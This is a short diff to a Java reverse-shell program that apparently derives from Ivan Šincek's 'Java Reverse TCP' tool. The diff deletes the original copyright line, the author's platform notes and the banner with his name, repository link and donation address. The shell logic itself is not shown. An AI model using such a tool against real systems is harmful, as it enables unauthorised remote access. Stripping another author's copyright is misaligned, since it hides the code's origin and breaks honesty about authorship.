@@ -1,9 +1,5 @@
 package apps.ReverseShell;
 
-//Copyright (c) 2021 Ivan Šincek
-//Requires Java SE v8 or greater and JDK v8 or greater.
-//Works on Linux OS, macOS, and Windows OS.
-
 
 import java.io.IOException;
 import java.io.InputStream;
@@ -130,15 +126,6 @@ public class ReverseShell {
  }
  
  public static void main(String[] args) {
-     System.out.print("#######################################################################\n");
-     System.out.print("#                                                                     #\n");
-     System.out.print("#                        Java Reverse TCP v2.7                        #\n");
-     System.out.print("#                                    by Ivan Sincek                   #\n");
-     System.out.print("#                                                                     #\n");
-     System.out.print("# GitHub repository at github.com/ivan-sincek/java-reverse-tcp.       #\n");
-     System.out.print("# Feel free to donate bitcoin at 1BrZM6T7G9RN8vbabnfXu4M6Lpgztq6Y14.  #\n");
-     System.out.print("#                                                                     #\n");
-     System.out.print("#######################################################################\n");
      if (args.length != 2) {
          System.out.print("Usage: java -jar Reverse_Shell.jar <addr> <port>\n");
      } else {
